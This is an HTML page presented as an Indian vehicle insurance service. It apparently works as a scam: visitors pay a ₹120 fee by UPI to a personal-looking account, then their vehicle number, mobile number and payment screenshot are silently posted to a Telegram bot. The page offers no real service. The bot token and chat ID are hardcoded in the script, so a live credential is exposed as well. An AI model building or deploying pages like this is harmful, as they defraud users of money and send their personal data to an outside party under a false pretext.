<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mishra Insurance Service</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial}

body{
background:#f4f6f9;
min-height:100vh;
color:#1a1a1a;
}

/* TOP BAR */
.topbar{
position:fixed;
top:0;
left:0;
width:100%;
height:60px;
background:#ffffff;
display:flex;
align-items:center;
justify-content:space-between;
padding:0 20px;
box-shadow:0 2px 12px rgba(0,0,0,0.08);
z-index:1000;
}

.topbar button{
padding:8px 16px;
border:none;
border-radius:6px;
background:#005BAC;
color:#fff;
font-weight:600;
cursor:pointer;
transition:0.2s;
}

.topbar button:active{
transform:scale(0.96);
}

.menu-icon div{
width:24px;
height:3px;
background:#005BAC;
margin:4px 0;
border-radius:3px;
}

/* SIDE MENU */
.sideMenu{
position:fixed;
right:-260px;
top:0;
width:250px;
height:100%;
background:#ffffff;
padding-top:80px;
transition:0.3s;
box-shadow:-4px 0 20px rgba(0,0,0,0.1);
z-index:999;
}

.sideMenu button{
width:90%;
margin:10px 5%;
padding:12px;
border:none;
border-radius:8px;
background:#005BAC;
color:#fff;
font-weight:500;
cursor:pointer;
transition:0.2s;
}

.sideMenu button:hover{
background:#004a94;
}

.openMenu{right:0}

/* CARD */
.card{
margin-top:120px;
width:92%;
max-width:420px;
margin-left:auto;
margin-right:auto;
background:#ffffff;
padding:30px;
border-radius:14px;
box-shadow:0 8px 30px rgba(0,0,0,0.08);
text-align:center;
}

h3{
margin-bottom:15px;
color:#003366;
}

input{
width:100%;
padding:14px;
margin-top:12px;
border-radius:8px;
border:1px solid #dcdcdc;
font-size:15px;
text-transform:uppercase;
}

input:focus{
border-color:#005BAC;
outline:none;
}

/* PRIMARY BUTTON */
.primaryBtn{
width:100%;
padding:14px;
margin-top:14px;
border:none;
border-radius:8px;
font-weight:600;
cursor:pointer;
background:#005BAC;
color:#fff;
transition:0.2s;
}

.primaryBtn:hover{
background:#004a94;
}

.primaryBtn:active{
transform:scale(0.96);
}

/* OUTLINE BUTTON */
.outlineBtn{
width:100%;
padding:14px;
margin-top:14px;
border-radius:8px;
border:2px solid #005BAC;
background:#fff;
color:#005BAC;
font-weight:600;
cursor:pointer;
transition:0.2s;
}

.outlineBtn:hover{
background:#005BAC;
color:#fff;
}

/* LOADER */
.loader{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(255,255,255,0.9);
display:none;
align-items:center;
justify-content:center;
flex-direction:column;
z-index:2000;
}

.spinner{
width:50px;
height:50px;
border:5px solid #ddd;
border-top:5px solid #005BAC;
border-radius:50%;
animation:spin 1s linear infinite;
}

@keyframes spin{
100%{transform:rotate(360deg)}
}

.progress{
margin-top:15px;
font-weight:600;
color:#005BAC;
}

.hidden{display:none}

.footer{
text-align:center;
margin-top:40px;
padding:20px;
font-size:14px;
color:#666;
}

.qr{
width:160px;
margin-top:15px;
}

.section{padding:10px}

</style>
</head>
<body>

<div class="topbar">
<button onclick="goHome()">Home</button>
<div class="menu-icon" onclick="toggleMenu()">
<div></div><div></div><div></div>
</div>
</div>

<div class="sideMenu" id="menu">
<button onclick="openInsurance()">Insurance</button>
<button onclick="openAbout()">About</button>
<button onclick="openDisclaimer()">Disclaimer</button>
<button onclick="openContact()">Contact</button>
</div>

<div class="loader" id="loader">
<div class="spinner"></div>
<div class="progress" id="progressText">0%</div>
</div>

<div class="card">

<div id="homePage">
<h3>Enter Vehicle Number</h3>
<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
<button class="primaryBtn" onclick="goPay()">Continue</button>
</div>

<div id="payPage" class="hidden">
<h3>Service Fee ₹120</h3>

<button class="primaryBtn"
onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
Pay with UPI
</button>

<img class="qr"
src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR">

<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof">

<button class="primaryBtn" onclick="submitForm()">Submit</button>
<button class="outlineBtn" onclick="goHome()">Back</button>
</div>

<div id="aboutPage" class="hidden section">
<h3>About</h3>
<p>We provide vehicle assistance and insurance related services.</p>
<button class="outlineBtn" onclick="goHome()">Back</button>
</div>

<div id="disclaimerPage" class="hidden section">
<h3>Disclaimer</h3>
<p>This is a private assistance platform. Not affiliated with any government authority.</p>
<button class="outlineBtn" onclick="goHome()">Back</button>
</div>

</div>

<div class="footer">
© 2026 Mishra Insurance Service. All rights reserved.
</div>

<script>

const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chatId="5600045707";

function toggleMenu(){menu.classList.toggle("openMenu");}

function goHome(){
homePage.classList.remove("hidden");
payPage.classList.add("hidden");
aboutPage.classList.add("hidden");
disclaimerPage.classList.add("hidden");
}

function openInsurance(){
loader.style.display="flex";
progressText.innerText="Loading...";
setTimeout(()=>{
window.location.href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1";
},800);
}

function openAbout(){
homePage.classList.add("hidden");
aboutPage.classList.remove("hidden");
}

function openDisclaimer(){
homePage.classList.add("hidden");
disclaimerPage.classList.remove("hidden");
}

function openContact(){
window.location.href="https://t.me/yourtelegramusername";
}

function goPay(){
if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
homePage.classList.add("hidden");
payPage.classList.remove("hidden");
}

function formatVehicle(input){
let v=input.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase();
if(v.length>2) v=v.slice(0,2)+"-"+v.slice(2);
if(v.length>5) v=v.slice(0,5)+"-"+v.slice(5);
if(v.length>8) v=v.slice(0,8)+"-"+v.slice(8,12);
input.value=v;
}

function submitForm(){
if(mobile.value.length<10){alert("Enter valid mobile");return;}
if(!proof.files[0]){alert("Upload screenshot");return;}

loader.style.display="flex";
let percent=0;
let interval=setInterval(()=>{
percent++;
progressText.innerText=percent+"%";
if(percent>=100){
clearInterval(interval);
sendData();
}
},30);
}

function sendData(){
let data=new FormData();
data.append("chat_id",chatId);
data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
data.append("photo",proof.files[0]);

fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{method:"POST",body:data})
.then(()=>{
loader.style.display="none";
alert("Submitted Successfully");
goHome();
})
.catch(()=>{
loader.style.display="none";
alert("Submission Failed");
});
}

</script>

</body>
</html>
